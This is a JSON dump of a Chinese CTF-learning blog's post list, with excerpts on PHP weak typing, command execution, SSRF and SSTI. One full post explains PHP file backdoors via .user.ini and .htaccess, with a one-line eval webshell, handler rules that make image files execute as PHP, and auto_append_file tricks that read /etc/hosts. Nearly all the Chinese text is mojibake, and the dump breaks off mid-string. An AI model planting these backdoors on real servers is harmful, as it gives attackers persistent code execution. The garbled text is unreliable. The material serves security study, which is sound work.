{"name":"ctf","slug":"ctf","count":24,"postlist":[{"title":"black_magic","slug":"Black-magic","date":"2019-08-19T10:59:50.000Z","updated":"2019-09-03T14:23:09.995Z","comments":true,"path":"api/articles/Black-magic.json","excerpt":"<p>åˆ«è¯´äº†ï¼Œå¬æˆ‘çš„ï¼php is the best language!æˆ‘ä¸å…è®¸ä½ æœ‰åˆ«çš„æƒ³æ³•ï¼ </p>\n<p>æˆ‘è¦æˆ‘è§‰å¾—ï¼ä¸è¦ä½ è§‰å¾—ï¼</p>","keywords":null,"cover":null,"content":null,"text":"åˆ«è¯´äº†ï¼Œå¬æˆ‘çš„ï¼php is the best language!æˆ‘ä¸å…è®¸ä½ æœ‰åˆ«çš„æƒ³æ³•ï¼ æˆ‘è¦æˆ‘è§‰å¾—ï¼ä¸è¦ä½ è§‰å¾—ï¼php å¼±ç±»å‹æ€»ç»“å­—ç¬¦ä¸æ•°å­—çš„æ¯”è¾ƒ&lt;?php$a=1;if($a=TRUE)    echo &quot;1111\\n&quot;;if($a=&apos;a&","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"å¼±ç±»å‹","slug":"å¼±ç±»å‹","count":1,"path":"api/tags/å¼±ç±»å‹.json"}]},{"title":"å‘½ä»¤æ‰§è¡Œæ¼æ´(Command Execution)","slug":"Command-Execution","date":"2019-03-23T07:13:47.000Z","updated":"2019-08-20T14:59:26.283Z","comments":true,"path":"api/articles/Command-Execution.json","excerpt":"<p>å½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºå»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨åˆ°ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚PHPä¸­çš„system,exec,shell_execç­‰ï¼Œå½“ç”¨æˆ·å¯ä»¥æ‰§è¡Œå‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°†å¯æ³¨å…¥æ¶æ„ç³»ç»Ÿå‘½ä»¤åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p>","keywords":null,"cover":null,"content":null,"text":"å½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºå»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨åˆ°ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚PHPä¸­çš„system,exec,shell_execç­‰ï¼Œå½“ç”¨æˆ·å¯ä»¥æ‰§è¡Œå‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°†å¯æ³¨å…¥æ¶æ„ç³»ç»Ÿå‘½ä»¤åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¼æ´æ¦‚å¿µå½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºå»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","count":1,"path":"api/tags/å‘½ä»¤æ‰§è¡Œ.json"}]},{"title":"HostSplit-Exploitable","slug":"HostSplit","date":"2019-08-22T03:39:23.000Z","updated":"2019-09-03T14:21:11.682Z","comments":true,"path":"api/articles/HostSplit.json","excerpt":"<p>ğŸ±é»‘å¸½å¤§ä¼šè®®é¢˜</p>","keywords":null,"cover":"http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg","content":null,"text":"ğŸ±é»‘å¸½å¤§ä¼šè®®é¢˜8/22/2019 11:39:23 AM HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization å­¦ä¹ IDN ä¸ UTF-8IDNå›½é™…åŒ–åŸŸåIDNs (Internationalized Domai","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"python","slug":"python","count":1,"path":"api/tags/python.json"}]},{"title":"JavaScript Prototype æ±¡æŸ“æ”»å‡»","slug":"JavaScriptåŸå‹æ±¡æŸ“","date":"2019-08-31T13:55:35.000Z","updated":"2019-09-03T14:19:49.369Z","comments":true,"path":"api/articles/JavaScriptåŸå‹æ±¡æŸ“.json","excerpt":"<p>JSçœŸæœ‰è¶£ï¼</p>","keywords":null,"cover":"https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476","content":null,"text":"JSçœŸæœ‰è¶£ï¼JavaScript Prototype æ±¡æŸ“æ”»å‡»JSåŸºæœ¬è¯­æ³•è¾“å‡ºwindow.alert();å¼¹å‡ºè­¦å‘Šæ¡†console.log();å°†å†…å®¹å†™åˆ°æ§åˆ¶å°  a = 5;<br>  b = 6;<br>  c = a + b;<br>  console.log(c);<b","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"javascript","slug":"javascript","count":1,"path":"api/tags/javascript.json"}]},{"title":"LSBå›¾ç‰‡éšå†™","slug":"LSBéšå†™","date":"2018-03-23T07:13:47.000Z","updated":"2019-08-10T07:51:34.491Z","comments":true,"path":"api/articles/LSBéšå†™.json","excerpt":"<p>å›¾ç‰‡éšå†™é¢˜è€æ˜¯ä¸€å¤´é›¾æ°´ï¼Œå€Ÿç€DDçš„åœ°é“æ¥å­¦ä¸€ä¸‹å§</p>","keywords":null,"cover":"https://i.imgur.com/GQM4keP.png","content":null,"text":"å›¾ç‰‡éšå†™é¢˜è€æ˜¯ä¸€å¤´é›¾æ°´ï¼Œå€Ÿç€DDçš„åœ°é“æ¥å­¦ä¸€ä¸‹å§LSBéšå†™åˆ©ç”¨å›¾åƒä¸­çš„æœ€ä½æœ‰æ•ˆä½è¿›è¡Œæ•°æ®å­˜å‚¨ã€‚ [Figure] æç¤ºå¯†é’¥ä¸ºå°å†™å­—æ¯ï¼Œå°è¯•è§£å¯†å°±å¾—åˆ°äº†flag.","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"LSB","slug":"LSB","count":1,"path":"api/tags/LSB.json"},{"name":"MISC","slug":"MISC","count":1,"path":"api/tags/MISC.json"},{"name":"éšå†™","slug":"éšå†™","count":1,"path":"api/tags/éšå†™.json"}]},{"title":"MYSQL LOAD DATA","slug":"MySQL-LOAD-DATA","date":"2019-08-07T14:14:02.000Z","updated":"2019-09-03T14:28:41.171Z","comments":true,"path":"api/articles/MySQL-LOAD-DATA.json","excerpt":"<p>é€šè¿‡ä¼ªé€ æ¶æ„æœåŠ¡å™¨é€ æˆçš„æ”»å‡»<br>ğŸ˜«ğŸ˜„</p>","keywords":null,"cover":"https://upload-images.jianshu.io/upload_images/9113969-2c46042011a696ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240","content":null,"text":"é€šè¿‡ä¼ªé€ æ¶æ„æœåŠ¡å™¨é€ æˆçš„æ”»å‡»<br>ğŸ˜«ğŸ˜„é…ç½®mysqlå¯åŠ¨mysqlæœåŠ¡service mysql startMariaDB [mysql]&gt; create database test;MariaDB [test]&gt; create table users(    ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"mysql load data","slug":"mysql-load-data","count":1,"path":"api/tags/mysql-load-data.json"}]},{"title":"redisä¸ssrf","slug":"SSRF","date":"2019-08-16T08:11:22.000Z","updated":"2019-09-03T14:24:58.258Z","comments":true,"path":"api/articles/SSRF.json","excerpt":"<p>SSRFç•™å‘ï¼Œæ²¡æ•´ç†å®Œã€‚æˆ‘çœŸæ˜¯ä¸ªå°èœé¸¡~</p>","keywords":null,"cover":null,"content":null,"text":"SSRFç•™å‘ï¼Œæ²¡æ•´ç†å®Œã€‚æˆ‘çœŸæ˜¯ä¸ªå°èœé¸¡~SSRFå‡½æ•°file_get_contentsfsockopencurl_execç»•è¿‡IPé™åˆ¶æ·»åŠ ç«¯å£ 127.0.0.1:80çŸ­ç½‘å€ http://sina.lt/æŒ‡å‘ä»»æ„IPçš„åŸŸå xip.ioè¿›åˆ¶è½¬æ¢ï¼Œç‚¹åˆ†åè¿›åˆ¶ï¼Œå…«è¿›åˆ¶ï¼ŒäºŒè¿›åˆ¶ï¼Œåå…­","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"redis","slug":"redis","count":2,"path":"api/tags/redis.json"},{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"}]},{"title":"Xdebug","slug":"Xdebug","date":"2019-08-17T15:23:45.000Z","updated":"2019-09-03T14:21:43.620Z","comments":true,"path":"api/articles/Xdebug.json","excerpt":"<p>ä½ ä»æœªè§è¿‡çš„èˆ¹æ–°çŸ¥è¯†ç‚¹</p>","keywords":null,"cover":null,"content":null,"text":"ä½ ä»æœªè§è¿‡çš„èˆ¹æ–°çŸ¥è¯†ç‚¹Xdebugå¦‚ä½•ç¡®å®šå¼€å¯åŠ¨æ€è°ƒè¯•ï¼Ÿåœ¨vpsä¸Šç›‘å¬9000ç«¯å£  nc -l -vv -p 9000å†æ‰“å¼€ä¸€ä¸ªçª—å£æ‰§è¡Œ curl &#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&#39","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"Xdebuf","slug":"Xdebuf","count":1,"path":"api/tags/Xdebuf.json"},{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]},{"title":"SSTI-æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥","slug":"SSTI","date":"2019-08-30T07:28:13.000Z","updated":"2019-09-10T10:13:55.250Z","comments":true,"path":"api/articles/SSTI.json","excerpt":"<p>ç»ˆäºåˆ°äº†å­¦ä¹ SSTIçš„æ—¶é—´å‘¢ï¼</p>","keywords":null,"cover":"http://rickgray.me/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png","content":null,"text":"ç»ˆäºåˆ°äº†å­¦ä¹ SSTIçš„æ—¶é—´å‘¢ï¼SSTI-æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥8/30/2019 3:28:13 PM æ³¨å…¥åŸç†ä½¿ç”¨PHPæ¨¡æ¿å¼•æ“Twigä½œä¾‹å­æ¼”ç¤ºæ³¨å…¥åŸç†&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloa","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":2,"path":"api/tags/SSTI.json"}]},{"title":"redisä¸ssrf","slug":"redis","date":"2019-08-10T07:44:26.000Z","updated":"2019-09-03T14:27:08.508Z","comments":true,"path":"api/articles/redis.json","excerpt":"<p>wula!<br>æˆ‘çˆ±å­¦ä¹ ï¼ğŸ¤«</p>","keywords":null,"cover":"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg","content":null,"text":"wula!<br>æˆ‘çˆ±å­¦ä¹ ï¼ğŸ¤«redisåè®®åˆ†ætcpdumpæŠ“åŒ…tcpdump -i lo port 6379 -w redis.pcapåœ¨redisæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤127.0.0.1:6379&gt; set name testOK127.0.0.1:6379&gt; get ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"redis","slug":"redis","count":2,"path":"api/tags/redis.json"},{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"}]},{"title":"ä¸¤ç§æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•","slug":"ä¸¤ç§æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•","date":"2019-09-18T01:19:34.000Z","updated":"2019-09-25T12:07:29.143Z","comments":true,"path":"api/articles/ä¸¤ç§æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•.json","excerpt":"","keywords":null,"cover":"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png","content":"<h1 id=\"ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š-htaccess-amp-user-ini\"><a href=\"#ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š-htaccess-amp-user-ini\" class=\"headerlink\" title=\"ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š.htaccess &amp; .user.ini\"></a>ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š.htaccess &amp; .user.ini</h1><h2 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h2><p>ä»¥ä¸‹éƒ¨åˆ†æ‘˜å–äºPç¥çš„åšå®¢<a href=\"http://www.vuln.cn/6001\" title=\"Pç¥åšå®¢\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<h3 id=\"user-ini-æ˜¯ä»€ä¹ˆï¼Ÿ\"><a href=\"#user-ini-æ˜¯ä»€ä¹ˆï¼Ÿ\" class=\"headerlink\" title=\".user.ini æ˜¯ä»€ä¹ˆï¼Ÿ\"></a>.user.ini æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>åªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨<code>.user.ini</code>æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•ã€‚ç›¸æ¯”äº<code>.htaccess</code>æœ‰æ›´å¤§çš„åˆ©ç”¨ç©ºé—´ã€‚ </p>\n<p>æˆ‘ä»¬ä»phpæ‰‹å†Œå¯ä»¥çœ‹åˆ°php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯é…ç½®é€‰é¡¹åˆ—è¡¨<a href=\"https://www.php.net/manual/zh/ini.list.php\" title=\"é…ç½®é¡¹åˆ—è¡¨\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/ini.list.php</a>  ä»è¡¨ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ <code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_SYSTEM</code>    ã€<code>PHP_INI_USER</code>ã€<code>PHP_INI_ALL</code> å››ç§æ¨¡å¼ï¼Œé‚£ä¹ˆè¿™å››ç§æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ  </p>\n<pre><code>æ¨¡å¼                å«ä¹‰\nPHP_INI_USER    å¯åœ¨ç”¨æˆ·è„šæœ¬ï¼ˆä¾‹å¦‚ ini_set() ï¼‰æˆ– Windows æ³¨å†Œè¡¨ï¼ˆè‡ª PHP 5.3 èµ·ï¼‰ä»¥åŠ .user.ini ä¸­è®¾å®š\nPHP_INI_PERDIR    å¯åœ¨ php.iniï¼Œ.htaccess æˆ– httpd.conf ä¸­è®¾å®š\nPHP_INI_SYSTEM    å¯åœ¨ php.ini æˆ– httpd.conf ä¸­è®¾å®š\nPHP_INI_ALL        å¯åœ¨ä»»ä½•åœ°æ–¹è®¾å®š</code></pre><p>è¿™é‡Œæåˆ°äº†æˆ‘ä»¬å¯ä»¥è‡ªå·±è®¾ç½®çš„æ¨¡å¼æœ‰ <code>PHP_INI_USER</code>ã€<code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_ALL</code>ã€‚ åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°äº† <code>.user.ini</code> ã€‚ç¿»é˜…æ‰‹å†Œ<a href=\"https://www.php.net/manual/zh/configuration.file.per-user.php\" title=\"æ‰‹å†Œ\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/configuration.file.per-user.php</a>å¯çŸ¥ï¼š</p>\n<blockquote>\n<p>è‡ª PHP 5.3.0 èµ·ï¼ŒPHP æ”¯æŒåŸºäºæ¯ä¸ªç›®å½•çš„ .htaccess é£æ ¼çš„ INI æ–‡ä»¶ã€‚æ­¤ç±»æ–‡ä»¶ä»…è¢« CGIï¼FastCGI SAPI å¤„ç†ã€‚æ­¤åŠŸèƒ½ä½¿å¾— PECL çš„ htscanner æ‰©å±•ä½œåºŸã€‚å¦‚æœä½¿ç”¨ Apacheï¼Œåˆ™ç”¨ .htaccess æ–‡ä»¶æœ‰åŒæ ·æ•ˆæœã€‚</p>\n<p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[â€˜DOCUMENT_ROOTâ€™] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p>\n<p>åœ¨ .user.ini é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ <strong>PHP_INI_PERDIR</strong> å’Œ <strong>PHP_INI_USER</strong> æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p>\n<p>ä¸¤ä¸ªæ–°çš„ INI æŒ‡ä»¤ï¼Œuser_ini.filename å’Œ user_ini.cache_ttl æ§åˆ¶ç€ç”¨æˆ· INI æ–‡ä»¶çš„ä½¿ç”¨ã€‚</p>\n<p>user_ini.filename è®¾å®šäº† PHP ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æœå¯»çš„æ–‡ä»¶åï¼›å¦‚æœè®¾å®šä¸ºç©ºå­—ç¬¦ä¸²åˆ™ PHP ä¸ä¼šæœå¯»ã€‚é»˜è®¤å€¼æ˜¯ .user.iniã€‚</p>\n<p>user_ini.cache_ttl æ§åˆ¶ç€é‡æ–°è¯»å–ç”¨æˆ· INI æ–‡ä»¶çš„é—´éš”æ—¶é—´ã€‚é»˜è®¤æ˜¯ 300 ç§’ï¼ˆ5 åˆ†é’Ÿï¼‰ã€‚</p>\n</blockquote>\n<p>åŒæ—¶ä¸php.iniä¸åŒçš„æ˜¯.user.iniæ˜¯ä¸€ä¸ªèƒ½åŠ¨æ€åŠ è½½çš„é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶å†…å®¹ä¹‹åä¸éœ€è¦é‡å¯ä¸­é—´ä»¶åªéœ€è¦ç­‰å¾…  <code>user_ini.cache_ttl</code> æ—¶é—´å³å¯è¢«åŠ è½½ã€‚</p>\n<p>ä¹Ÿå°±æ˜¯è¯´ <code>.user.ini</code> å…¶å®å°±æ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰phpé…ç½®çš„æ–‡ä»¶ã€‚</p>\n<h3 id=\"å¦‚ä½•åˆ©ç”¨ï¼Ÿ\"><a href=\"#å¦‚ä½•åˆ©ç”¨ï¼Ÿ\" class=\"headerlink\" title=\"å¦‚ä½•åˆ©ç”¨ï¼Ÿ\"></a>å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h3><p>ä»phpé…ç½®åˆ—è¡¨é‡Œæˆ‘ä»¬å‘ç°æ— æ³•é…ç½®ä¸€äº›å…³é”®çš„é…ç½®ï¼Œä½†æ˜¯åœ¨æ„æˆæ–‡ä»¶åé—¨æ—¶æˆ‘ä»¬æ‰¾åˆ°äº†ä¸¤ä¸ªæˆ‘ä»¬å¯ä»¥è‡ªå·±é…ç½®çš„é€‰é¡¹ï¼š</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt></p>\n<p><strong>auto_prepend_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-prepending.</p>\n</blockquote>\n<p>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åœ¨ä¸»æ–‡ä»¶ä¹‹å‰è‡ªåŠ¨è§£æï¼Œè¿™ä¸ªè¢«åŒ…å«çš„æ–‡ä»¶ç›¸å½“äºåœ¨ä¸»æ–‡ä»¶ä¹‹å‰è°ƒç”¨äº† <code>require</code> å‡½æ•°ï¼Œè·¯å¾„å—åˆ°<code>include_path</code> é™åˆ¶ã€‚ <code>include_path</code> ä¼šæŒ‡å®š <em>require, include, fopen(), file(), readfile() and file_get_contents()</em> è¿™äº›å‡½æ•°æ‰§è¡Œæ—¶å»å“ªå¯»æ‰¾æ–‡ä»¶ã€‚</p>\n<p><strong>auto_append_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-appending.</p>\n<p>Note: If the script is terminated with exit(), auto-append will not occur.</p>\n</blockquote>\n<p>æˆ‘ä»¬åˆ©ç”¨çš„é‡ç‚¹æ˜¯ç¬¬ä¸€ä¸ªé…ç½®ï¼ŒåŒæ—¶æˆ‘ä»¬ä»æ–‡æ¡£ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨åˆ©ç”¨æ—¶æˆ‘ä»¬éœ€è¦ä¸€ä¸ª<strong>æ­£å¸¸</strong>çš„phpæ–‡ä»¶æ¥åŒ…å«æˆ‘ä»¬çš„webshellï¼Œ*<em>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªæœ‰åœ¨æ–‡ä»¶å¤¹é‡Œæœ‰å¯ä»¥æ­£å¸¸è§£æ(ä½¿ç”¨fastcgiæ¨¡å¼è§£æ)çš„phpæ–‡ä»¶æ—¶æ‰èƒ½è¿™æ ·åˆ©ç”¨ã€‚<br>*</em><br>ä½¿ç”¨æ—¶ä¹Ÿç®€å•ç›´æ¥å†™åœ¨<code>.user.ini</code>ä¸­</p>\n<pre><code>auto_prepend_file=webshell.jpg</code></pre><h3 id=\"æ•ˆæœå¦‚ä½•ï¼Ÿ\"><a href=\"#æ•ˆæœå¦‚ä½•ï¼Ÿ\" class=\"headerlink\" title=\"æ•ˆæœå¦‚ä½•ï¼Ÿ\"></a>æ•ˆæœå¦‚ä½•ï¼Ÿ</h3><p>ç¯å¢ƒwin10+php-5.45-nts+Nginx</p>\n<p>ç»“æœå¦‚ä¸‹ï¼š</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg\" alt=\"æ•ˆæœå¦‚å›¾\"></p>\n<h2 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h2><h3 id=\"htaccessæ˜¯ä»€ä¹ˆï¼Ÿ\"><a href=\"#htaccessæ˜¯ä»€ä¹ˆï¼Ÿ\" class=\"headerlink\" title=\".htaccessæ˜¯ä»€ä¹ˆï¼Ÿ\"></a>.htaccessæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>ç¿»é˜…apacehå®˜æ–¹æ–‡æ¡£<a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a>å¯çŸ¥</p>\n<blockquote>\n<p>.htaccess files provide a way to make configuration changes on a per-directory basis.</p>\n</blockquote>\n<p><code>.htaccess</code> æ–‡ä»¶æä¾›äº†ä¸€ç§ç›®å½•çº§åˆ«çš„ä¿®æ”¹é…ç½®çš„æ–¹å¼ã€‚ä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒ…å«ä¸€æ¡æˆ–å¤šæ¡é…ç½®æŒ‡ä»¤ï¼Œæ”¾ç½®äºç›®å½•ä¸‹ï¼Œè¿™äº›é…ç½®æŒ‡ä»¤å¯¹å½“å‰ç›®å½•å’Œå…¶æ‰€æœ‰å­ç›®å½•ç”Ÿæ•ˆã€‚</p>\n<h3 id=\"SetHandler\"><a href=\"#SetHandler\" class=\"headerlink\" title=\"SetHandler\"></a>SetHandler</h3><p>æˆ‘ä»¬åœ¨ <code>.htaccess</code> æ–‡ä»¶ä¸­å¯ä»¥é€šè¿‡å¢åŠ  <code>handler-name</code> æ¥é…ç½®æ–‡ä»¶çš„è§£ææ–¹å¼ã€‚æ¯”å¦‚ä½ æœ‰ä¸€ä¸ªç›®å½•ï¼Œä½ æƒ³è®©å®ƒè¢« <code>imagemap rule files</code> è§£æï¼Œä½ å¯ä»¥åœ¨åœ¨ <code>.htaccess</code> æ–‡ä»¶ä¸­åŠ å…¥è¿™æ®µä»£ç ï¼š</p>\n<pre><code>SetHandler imap-file</code></pre><p>åŒæ ·çš„ï¼Œ<code>AddType</code> å¯æŒ‡ç¤ºæ–‡ä»¶ç®¡ç†ç³»ç»Ÿå¯¹ç»™å‡ºçš„æ–‡ä»¶åä»¥é€‰å®šçš„æ–‡ä»¶ç±»å‹è¿›è¡Œè§£æã€‚</p>\n<pre><code>AddType image/gif .gif</code></pre><p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ä»¥ <code>php</code> ä½œä¸º <code>Apacec module</code> æ—¶ï¼Œé€šè¿‡ <code>php_value</code> æ¥é…ç½®PHPçš„é…ç½®é€‰é¡¹ï¼š</p>\n<pre><code>php_value name value</code></pre><p>è®¾ç½®æŒ‡å®šçš„å€¼. åªé€‚åˆäº PHP_INI_ALL å’Œ PHP_INI_PERDIR ç±»å‹æŒ‡ä»¤</p>\n<h3 id=\"å¦‚ä½•åˆ©ç”¨ï¼Ÿ-1\"><a href=\"#å¦‚ä½•åˆ©ç”¨ï¼Ÿ-1\" class=\"headerlink\" title=\"å¦‚ä½•åˆ©ç”¨ï¼Ÿ\"></a>å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h3><p><strong>æ–‡ä»¶è§£æä¸Šä¼ æ¼æ´</strong></p>\n<p>.htaccessæ–‡ä»¶ä¸­å®šä¹‰äº†å°†ä¸Šä¼ çš„æ–‡ä»¶åç¼€åä¸º .jpg æ ¼å¼çš„æ–‡ä»¶ä»¥ php æ ¼å¼æ¥è§£ææ–‡ä»¶ã€‚.htaccess æ˜¯apacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¸æ˜¯ä¸Šä¼ çš„æ–‡ä»¶çš„é»‘åå•ä¹‹å†…ï¼Œæ‰€ä»¥è¯¥ç±»å‹æ–‡ä»¶å¯ä»¥ä¸Šä¼ æˆåŠŸã€‚</p>\n<pre><code>AddType  application/x-httpd-php  .jpg</code></pre><p>è¿˜å¯ä»¥è¿™æ ·ï¼š</p>\n<pre><code># FileMatch å‚æ•°å³ä¸ºæ–‡ä»¶åçš„æ­£åˆ™åŒ¹é…\n&lt;FilesMatch &quot;sniperoj&quot;&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n\n// sniperoj\n&lt;?php eval($_GET[&apos;c&apos;]);?&gt;</code></pre><p><strong>æ–‡ä»¶åŒ…å«</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file /etc/hosts</code></pre><p><strong>PHP ä»£ç æ‰§è¡Œ</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file .htaccess\n#&lt;?php phpinfo();</code></pre><h2 id=\"å‚è€ƒ\"><a href=\"#å‚è€ƒ\" class=\"headerlink\" title=\"å‚è€ƒ\"></a>å‚è€ƒ</h2><blockquote>\n<p><a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p>\n<p><a href=\"http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html\" target=\"_blank\" rel=\"noopener\">http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/core.html#sethandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/core.html#sethandler</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler</a></p>\n<p><a href=\"https://www.php.net/manual/en/configuration.changes.php\" 